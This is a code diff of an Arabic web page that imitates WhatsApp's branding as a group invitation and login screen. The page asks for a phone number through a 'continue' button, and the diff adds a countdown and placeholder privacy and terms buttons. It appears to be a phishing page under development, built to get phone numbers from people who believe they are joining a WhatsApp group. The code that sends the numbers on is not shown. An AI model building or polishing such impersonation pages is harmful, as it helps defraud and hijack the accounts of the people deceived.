@@ -3,10 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:image" content="https://your-image-link.jpg">
-    <meta property="og:title" content="الدعوة للانضمام إلى مجموعة واتساب">
-    <meta property="og:description" content="الدعوة للانضمام إلى مجموعة واتساب. اضغط على الرابط للانضمام.">
-    <meta property="og:url" content="https://your-link-to-group.com">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
     <title>الدعوة للانضمام إلى مجموعة واتساب</title>
     <style>
@@ -31,18 +27,16 @@
         .navbar .logo {
             display: flex;
             align-items: center;
+            gap: 10px;
         }
 
         .navbar .logo img {
-            height: 30px;
-            margin-right: 10px;
+            height: 40px;
         }
 
-        .navbar .language-switch {
-            font-size: 16px;
-            color: white;
-            cursor: pointer;
-            text-decoration: underline;
+        .navbar .logo span {
+            font-size: 20px;
+            font-weight: bold;
         }
 
         .container {
@@ -106,20 +100,45 @@
             background-color: #1DA955;
         }
 
-        .footer {
+        .countdown {
+            font-size: 16px;
+            color: #25D366;
+            margin-top: 20px;
+        }
+
+        footer {
             text-align: center;
             margin-top: 20px;
             color: #888;
             font-size: 12px;
-            padding: 20px 0;
+        }
+
+        .language-switch {
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .footer-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .footer-buttons button {
+            padding: 5px 10px;
+            font-size: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            cursor: pointer;
             background-color: #f9f9f9;
         }
 
-        .footer .description {
-            font-size: 14px;
-            color: #555;
-            margin-top: 10px;
-            line-height: 1.5;
+        .footer-buttons button:hover {
+            background-color: #eee;
         }
     </style>
 </head>
@@ -129,9 +148,8 @@
     <div class="navbar">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-            <span>الدعوة للانضمام إلى مجموعة واتساب</span>
+            <span>واتساب</span>
         </div>
-        <div class="language-switch" onclick="toggleLanguage()">English</div>
     </div>
 
     <!-- Main Container -->
@@ -157,36 +175,28 @@
             <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
         </div>
         <button onclick="sendMessage()">متابعة</button>
+        <div class="countdown" id="countdown"></div>
     </div>
 
     <!-- Footer -->
-    <div class="footer">
-        <div>©️ 2024 واتساب</div>
-        <div class="description">
-            WhatsApp هو تطبيق مراسلة شهير يتيح لك التواصل مع أصدقائك وعائلتك باستخدام النصوص والصور والمكالمات الصوتية والفيديو. انضم إلينا الآن!
+    <footer>
+        <div class="footer-buttons">
+            <button>سياسة الخصوصية</button>
+            <button>شروط الاستخدام</button>
+            <button>مساعدة</button>
         </div>
-    </div>
+        <div class="language-switch" onclick="toggleLanguage()">تغيير اللغة</div>
+    </footer>
 
     <script>
-        let currentLanguage = 'ar';
-
         function toggleLanguage() {
             const languageSwitch = document.querySelector('.language-switch');
-            const title = document.querySelector('.title');
-            const description = document.querySelector('.description');
-
-            if (currentLanguage === 'ar') {
+            if (languageSwitch.textContent.trim() === 'تغيير اللغة') {
                 document.body.setAttribute('dir', 'ltr');
-                title.textContent = 'Login';
-                description.textContent = 'Invite to join a WhatsApp group.';
-                languageSwitch.textContent = 'العربية';
-                currentLanguage = 'en';
+                languageSwitch.textContent = 'Switch to Arabic';
             } else {
                 document.body.setAttribute('dir', 'rtl');
-                title.textContent = 'تسجيل الدخول';
-                description.textContent = 'الدعوة للانضمام إلى مجموعة واتساب.';
-                languageSwitch.textContent = 'English';
-                currentLanguage = 'ar';
+                languageSwitch.textContent = 'تغيير اللغة';
             }
         }
 
